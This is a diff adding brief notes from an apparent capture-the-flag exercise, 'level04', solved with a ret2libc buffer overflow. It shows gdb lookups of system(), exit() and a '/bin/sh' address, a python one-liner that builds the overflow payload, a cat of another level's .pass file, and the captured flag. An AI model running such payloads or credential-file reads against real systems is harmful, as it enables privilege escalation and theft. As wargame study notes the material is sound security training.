@@ -1,0 +1,79 @@
+level04
+
+----- CAT -----
+Give me some shellcode, kchild is exi iting...no exec() for youP
+
+Give me some shellcode, k
+child is exiting...
+no exec() for you
+
+----- EXEC -----
+
+Give me some shellcode, k
+child is exiting...
+
+length 155
+
+when crash the app go into a loop < 156
+
+Now try a ret2libc. Need the addresses of system(), exit() and a "/bin/sh" string like we do with level 1
+
+(gdb) info function system
+....
+0xf7e6aed0  system
+....
+
+(gdb) info function exit
+....
+0xf7e5eb70  exit
+....
+
+(gdb) info proc map
+process 1742
+Mapped address spaces:
+
+    Start Addr   End Addr       Size     Offset objfile
+    0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
+    0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
+    0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
+    0xf7e2b000 0xf7e2c000     0x1000        0x0 
+    0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+    0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+    0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+    0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+    0xf7fd0000 0xf7fd4000     0x4000        0x0 
+    0xf7fda000 0xf7fdb000     0x1000        0x0 
+    0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+    0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+    0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+    0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+    0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+
+(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
+0xf7f897ec
+1 pattern found.
+
+(gdb) x/s 0xf7f897ec
+0xf7f897ec:	 "/bin/sh"
+
+----- GDB -----
+
+0x08048634  clear_stdin
+0x08048657  get_unum
+0x0804868f  prog_timeout
+0x080486a0  enable_timeout_cons
+0x080486c8  main
+
+we can see 5 functions
+
+python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/payload
+
+----- FLAG -----
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+----- INFO -----
+
+whoami
+level05
+cat /home/users/level05/.pass
+
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
